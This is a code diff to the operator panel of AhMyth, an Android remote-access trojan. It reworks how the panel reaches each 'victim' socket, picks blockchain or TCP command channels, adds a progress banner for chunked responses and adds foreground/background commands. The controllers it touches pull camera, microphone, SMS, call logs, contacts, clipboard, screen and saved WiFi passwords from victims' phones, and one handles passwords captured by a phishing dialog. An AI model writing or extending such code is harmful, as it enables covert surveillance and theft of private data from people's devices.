@@ -78,7 +78,39 @@ try {
 }
 
 var ORDER = CONSTANTS.order;
-var originalSocket = remote.getCurrentWebContents().victim;
+// Get originalSocket from victim (socket) or victimData (victim object with socket property)
+var getOriginalSocket = () => {
+    try {
+        if (!remote || !remote.getCurrentWebContents) {
+            console.warn('[LabCtrl] remote.getCurrentWebContents not available');
+            return null;
+        }
+        const webContents = remote.getCurrentWebContents();
+        if (!webContents) {
+            console.warn('[LabCtrl] webContents not available');
+            return null;
+        }
+        // If victimData exists, get socket from it, otherwise use victim directly (which is the socket)
+        if (webContents.victimData && webContents.victimData.socket) {
+            return webContents.victimData.socket;
+        }
+        // Fallback: victim might be the socket directly
+        if (webContents.victim) {
+            // Check if victim is a socket (has emit method) or a victim object (has socket property)
+            if (webContents.victim.emit && typeof webContents.victim.emit === 'function') {
+                return webContents.victim; // It's the socket
+            } else if (webContents.victim.socket) {
+                return webContents.victim.socket; // It's a victim object with socket property
+            }
+        }
+        console.warn('[LabCtrl] No socket found in victim or victimData');
+        return null;
+    } catch (e) {
+        console.error('[LabCtrl] Error getting socket:', e);
+        return null;
+    }
+};
+var originalSocket = getOriginalSocket();
 
 var dataPath = path.join(homedir(), CONSTANTS.dataDir);
 var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
@@ -116,21 +148,60 @@ var debugLogFile = path.join(logPath, `debug-${new Date().toISOString().split('T
 var labScope = null;
 var rootScope = null;
 // Victim metadata (used to decide blockchain vs TCP)
-const currentVictim = (remote && remote.getCurrentWebContents && remote.getCurrentWebContents().victim) || {};
+// Get victim data object (not just socket) - prefer victimData, fallback to victim
+const getCurrentVictim = () => {
+    if (!remote || !remote.getCurrentWebContents) return {};
+    const webContents = remote.getCurrentWebContents();
+    // Prefer victimData (full victim object) over victim (socket)
+    return webContents.victimData || webContents.victim || {};
+};
+// Make getCurrentVictim accessible globally for controller
+window.getCurrentVictim = getCurrentVictim;
+const currentVictim = getCurrentVictim();
 
-function isBlockchainVictim(victim = currentVictim) {
+function isBlockchainVictim(victim = null) {
+    // Always refresh victim data to ensure we have the latest connection info
+    if (!victim || (victim.emit && typeof victim.emit === 'function')) {
+        // If no victim provided or victim is a socket object, get fresh data
+        victim = getCurrentVictim();
+    }
+    
     if (!victim) return false;
+    
+    // If victim is still a socket object (has emit/on methods), try to get victimData
+    if (victim.emit && typeof victim.emit === 'function' && remote && remote.getCurrentWebContents) {
+        const webContents = remote.getCurrentWebContents();
+        victim = webContents.victimData || victim;
+    }
+    
     // Safely convert to strings - handle cases where values might be objects or other types
     const connectionType = (typeof victim.connectionType === 'string' ? victim.connectionType : (victim.connectionType ? String(victim.connectionType) : '')).toLowerCase();
     const conn = (typeof victim.conn === 'string' ? victim.conn : (victim.conn ? String(victim.conn) : '')).toLowerCase();
     const ipLabel = (typeof victim.ip === 'string' ? victim.ip : (victim.ip ? String(victim.ip) : '')).toLowerCase().trim();
-    return !!(
+    
+    // Check if it's explicitly blockchain
+    const isBlockchain = !!(
         victim.isBlockchain ||
         connectionType === 'blockchain' ||
         conn === 'blockchain' ||
         ipLabel === 'blockchain' ||
         ipLabel.startsWith('blockchain')
     );
+    
+    // For TCP clients: if socket is connected and not explicitly blockchain, use TCP
+    // Check if socket exists and is connected
+    const currentSocket = getOriginalSocket();
+    const hasConnectedSocket = currentSocket && currentSocket.connected;
+    
+    // If it's not explicitly blockchain and has a connected socket, it's TCP
+    if (!isBlockchain && hasConnectedSocket) {
+        // Has connected socket and not blockchain - must be TCP
+        return false;
+    }
+    
+    // If no socket connection and not explicitly blockchain, default to TCP (not blockchain)
+    // Only use blockchain if explicitly marked as blockchain
+    return isBlockchain;
 }
 
 // ---------------- Blockchain helpers -----------------
@@ -824,10 +895,23 @@ function dispatchListener(event, data) {
 // Wrap socket with logging - improved version that tracks listeners
 var socket = {
     emit: function(event, data) {
-        const useBlockchain = currentVictim && ((currentVictim.connectionType === 'blockchain') || currentVictim.isBlockchain || currentVictim.conn === 'blockchain' || !currentVictim.ip);
+        // Refresh socket reference in case it changed
+        const currentSocket = getOriginalSocket();
+        
+        // Get current victim data (may be updated)
+        const victim = getCurrentVictim();
+        const isBlockchain = isBlockchainVictim(victim);
+        
+        // For TCP clients: use TCP socket if connected
+        // Only use blockchain if explicitly blockchain OR socket is not connected
+        const useBlockchain = isBlockchain || !currentSocket || !currentSocket.connected;
+        
         logToFile('REQUEST', event, data);
         if (labScope) labScope.packetCount++;
-        if (useBlockchain || !originalSocket || !originalSocket.connected) {
+        
+        console.log(`[LabCtrl] emit(${event}): useBlockchain=${useBlockchain}, isBlockchain=${isBlockchain}, socketConnected=${currentSocket && currentSocket.connected}, connectionType=${victim.connectionType || 'unknown'}, conn=${victim.conn || 'unknown'}`);
+        
+        if (useBlockchain) {
             const action = data && data.order ? data.order : event;
             const payload = data || {};
             const description = payload.extra ? `${action} (${payload.extra})` : action;
@@ -855,17 +939,27 @@ var socket = {
                     throw e;
                 });
         }
-        return originalSocket.emit(event, data);
+        // Use current socket reference
+        const currentSocket = getOriginalSocket();
+        if (!currentSocket) {
+            throw new Error('Socket not available');
+        }
+        return currentSocket.emit(event, data);
     },
     on: function(event, callback) {
+        const currentSocket = getOriginalSocket();
+        if (!currentSocket) {
+            console.error(`[LabCtrl] Cannot register listener for ${event}: socket not available`);
+            return;
+        }
         // Track registration to prevent duplicate listeners
         if (registeredListeners[event]) {
             console.log(`[AhMyth] Listener already registered for ${event}, replacing...`);
-            originalSocket.removeAllListeners(event);
+            currentSocket.removeAllListeners(event);
         }
         registeredListeners[event] = true;
         
-        return originalSocket.on(event, function(data) {
+        return currentSocket.on(event, function(data) {
             logToFile('RESPONSE', event, data);
             if (labScope) labScope.packetCount++;
             clearBlockchainResponseTimer(event);
@@ -899,14 +993,22 @@ var socket = {
                 }
             }
         };
-        return originalSocket.once(event, wrappedCallback);
+        const currentSocket = getOriginalSocket();
+        if (!currentSocket) {
+            console.error(`[LabCtrl] Cannot register once listener for ${event}: socket not available`);
+            return;
+        }
+        return currentSocket.once(event, wrappedCallback);
     },
     removeAllListeners: function(event) {
         delete registeredListeners[event];
-        return originalSocket.removeAllListeners(event);
+        const currentSocket = getOriginalSocket();
+        if (!currentSocket) return;
+        return currentSocket.removeAllListeners(event);
     },
     connected: function() {
-        return originalSocket && originalSocket.connected;
+        const currentSocket = getOriginalSocket();
+        return currentSocket && currentSocket.connected;
     }
 };
 
@@ -1007,19 +1109,45 @@ app.config(function ($routeProvider, $locationProvider) {
 
 //-----------------------LAB Controller (lab.htm)------------------------
 // controller for Lab.html and its views mic.html,camera.html..etc
-app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $interval) {
+app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $interval, $timeout) {
     $labCtrl = $scope;
     $labCtrl.logs = [];
     $labCtrl.isConnected = true; // Start as connected since lab opens on connection
     $labCtrl.sessionId = Date.now().toString(36).toUpperCase();
     $labCtrl.uptime = '00:00:00';
     $labCtrl.packetCount = 0;
+    $labCtrl.chunkProgress = { active: false, percent: 0, received: 0, total: 0, label: '' };
+    let chunkProgressHideTimer = null;
+    $rootScope.chunkProgress = $labCtrl.chunkProgress;
     
     // Enable UI logging by setting scope reference
     if (window.setLabScope) {
         window.setLabScope($scope, $rootScope);
         console.log('[AhMyth Lab] UI logging enabled');
     }
+    
+    // Log connection type detection on initialization
+    const initVictim = getCurrentVictim();
+    const initIsBlockchain = isBlockchainVictim(initVictim);
+    console.log('[LabCtrl] Initialized with victim data:', {
+        connectionType: initVictim.connectionType || 'unknown',
+        conn: initVictim.conn || 'unknown',
+        ip: initVictim.ip || 'unknown',
+        isBlockchain: initVictim.isBlockchain || false,
+        socketAvailable: !!getOriginalSocket(),
+        socketConnected: getOriginalSocket() && getOriginalSocket().connected,
+        detectedAsBlockchain: initIsBlockchain
+    });
+    const initSocket = getOriginalSocket();
+    if ($rootScope && $rootScope.Log) {
+        if (!initSocket) {
+            $rootScope.Log('[⚠] Lab initialized but socket not available - connection may be lost', CONSTANTS.logStatus.WARNING);
+        } else {
+            const connType = initIsBlockchain ? 'Blockchain' : 'TCP';
+            $rootScope.Log(`[ℹ] Lab initialized: Using ${connType} connection (${initVictim.connectionType || initVictim.conn || 'tcp'})`, CONSTANTS.logStatus.INFO);
+        }
+    }
+    console.log('[AhMyth Lab] UI logging enabled');
     
     var startTime = Date.now();
     
@@ -1038,7 +1166,8 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $inte
     $interval(() => {
         try {
             // Check if the original socket is connected
-            if (originalSocket && originalSocket.connected) {
+            const currentSocket = getOriginalSocket();
+            if (currentSocket && currentSocket.connected) {
                 if (!$labCtrl.isConnected) {
                     $labCtrl.isConnected = true;
                     $rootScope.Log('[✓] Connection active', CONSTANTS.logStatus.SUCCESS);
@@ -1241,6 +1370,31 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $inte
                 if (rootScope && rootScope.$broadcast) {
                     rootScope.$broadcast('Blockchain:ChunkReceived', chunkInfo);
                 }
+
+                // Update global chunk progress banner for any chunked responses
+                const progressCount = chunkInfo.received || 0;
+                const percent = progressCount && chunkInfo.total ? Math.round((progressCount / chunkInfo.total) * 100) : 0;
+                const label = chunkInfo.chunkId ? `Chunked response ${chunkInfo.chunkId}` : 'Chunked response in progress';
+                $rootScope.chunkProgress = {
+                    active: true,
+                    percent,
+                    received: progressCount,
+                    total: chunkInfo.total,
+                    label
+                };
+                $labCtrl.chunkProgress = $rootScope.chunkProgress;
+                if (chunkProgressHideTimer) $timeout.cancel(chunkProgressHideTimer);
+                if (progressCount && chunkInfo.total && progressCount >= chunkInfo.total) {
+                    chunkProgressHideTimer = $timeout(() => {
+                        $rootScope.chunkProgress = { active: false, percent: 100, received: progressCount, total: chunkInfo.total, label: 'Completed' };
+                        $labCtrl.chunkProgress = $rootScope.chunkProgress;
+                    }, 4000);
+                }
+                try {
+                    if (!$rootScope.$$phase && !$rootScope.$root.$$phase) {
+                        $rootScope.$apply();
+                    }
+                } catch (_) {}
                 
                 // Only log every 10 chunks received (based on count, not part number) to avoid spam
                 const receivedCount = chunkInfo.received || 0;
@@ -1349,7 +1503,8 @@ app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
         if (isBlockchainVictim()) {
             return true;
         }
-        if (!originalSocket || !originalSocket.connected) {
+        const currentSocket = getOriginalSocket();
+        if (!currentSocket || !currentSocket.connected) {
             $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
             $camCtrl.load = '';
             $camCtrl.lastError = 'Device not connected';
@@ -2016,7 +2171,8 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
         if (isBlockchainVictim()) {
             return true;
         }
-        if (!originalSocket || !originalSocket.connected) {
+        const currentSocket = getOriginalSocket();
+        if (!currentSocket || !currentSocket.connected) {
             $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
             $fmCtrl.load = '';
             return false;
@@ -2224,7 +2380,8 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
             // Send via socket wrapper (works for both TCP/IP and blockchain)
             if (checkConnection()) {
                 // Use socket wrapper which handles both TCP/IP and blockchain modes
-                if (originalSocket && originalSocket.connected) {
+                const currentSocket = getOriginalSocket();
+            if (currentSocket && currentSocket.connected) {
                     originalSocket.emit('chunk_ack', ackData);
                     console.log(`[FmCtrl] Sent chunk ACK: ${transferId}:${chunkIndex}`);
                 } else if (isBlockchainVictim()) {
@@ -2329,7 +2486,8 @@ app.controller("SMSCtrl", function ($scope, $rootScope, $timeout) {
         if (isBlockchainVictim()) {
             return true;
         }
-        if (!originalSocket || !originalSocket.connected) {
+        const currentSocket = getOriginalSocket();
+        if (!currentSocket || !currentSocket.connected) {
             $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
             $SMSCtrl.load = '';
             return false;
@@ -2513,7 +2671,8 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
         if (isBlockchainVictim()) {
             return true;
         }
-        if (!originalSocket || !originalSocket.connected) {
+        const currentSocket = getOriginalSocket();
+        if (!currentSocket || !currentSocket.connected) {
             $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
             $CallsCtrl.load = '';
             return false;
@@ -2609,7 +2768,8 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
         if (isBlockchainVictim()) {
             return true;
         }
-        if (!originalSocket || !originalSocket.connected) {
+        const currentSocket = getOriginalSocket();
+        if (!currentSocket || !currentSocket.connected) {
             $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
             $ContCtrl.load = '';
             return false;
@@ -2732,7 +2892,8 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
         if (isBlockchainVictim()) {
             return true;
         }
-        if (!originalSocket || !originalSocket.connected) {
+        const currentSocket = getOriginalSocket();
+        if (!currentSocket || !currentSocket.connected) {
             $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
             return false;
         }
@@ -3445,6 +3606,16 @@ app.controller("ClipboardCtrl", function ($scope, $rootScope) {
         socket.emit(ORDER, { order: clipboard, extra: 'stop' });
     };
 
+    $ClipboardCtrl.bringToForeground = () => {
+        $rootScope.Log('[→] Bringing app to foreground...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: CONSTANTS.orders.foreground || 'x0000fg', extra: 'foreground' });
+    };
+
+    $ClipboardCtrl.sendToBackground = () => {
+        $rootScope.Log('[→] Sending app to background...', CONSTANTS.logStatus.INFO);
+        socket.emit(ORDER, { order: CONSTANTS.orders.foreground || 'x0000fg', extra: 'background' });
+    };
+
     socket.on(clipboard, (data) => {
         if (data.hasData && data.text) {
             $ClipboardCtrl.clipboardText = data.text;
@@ -3764,11 +3935,12 @@ app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) 
         
         // Check socket connection
         var isConnected = false;
-        if (originalSocket) {
-            if (typeof originalSocket.connected === 'function') {
-                isConnected = originalSocket.connected();
+        const currentSocket = getOriginalSocket();
+        if (currentSocket) {
+            if (typeof currentSocket.connected === 'function') {
+                isConnected = currentSocket.connected();
             } else {
-                isConnected = originalSocket.connected === true;
+                isConnected = currentSocket.connected === true;
             }
         }
         
@@ -5747,8 +5919,22 @@ app.controller("WiFiPasswordsCtrl", function ($scope, $rootScope) {
     socket.on(wifiPasswords, (data) => {
         $WiFiPwdCtrl.isLoading = false;
         
-        // Check if this is a captured password from phishing dialog
-        if (data.password && data.ssid) {
+        // Prefer showing any network data even if an error field is present
+        if (data.networks || data.currentNetwork) {
+            const networks = Array.isArray(data.networks) ? data.networks.slice() : [];
+            if (data.currentNetwork && !networks.find(n => n.ssid === data.currentNetwork.ssid)) {
+                networks.unshift({ ...data.currentNetwork });
+            }
+            $WiFiPwdCtrl.wifiNetworks = networks.map(n => ({ ...n, showPassword: false }));
+            const count = $WiFiPwdCtrl.wifiNetworks.length;
+            $rootScope.Log(`[?] Found ${count} saved WiFi network${count === 1 ? '' : 's'}`, CONSTANTS.logStatus.SUCCESS);
+            if (data.note) {
+                $rootScope.Log(`[!] ${data.note}`, CONSTANTS.logStatus.WARN);
+            }
+            if (data.error) {
+                $rootScope.Log(`[!] Additional info: ${data.error}`, CONSTANTS.logStatus.WARN);
+            }
+        } else if (data.password && data.ssid) {
             $WiFiPwdCtrl.capturedPassword = {
                 ssid: data.ssid,
                 password: data.password
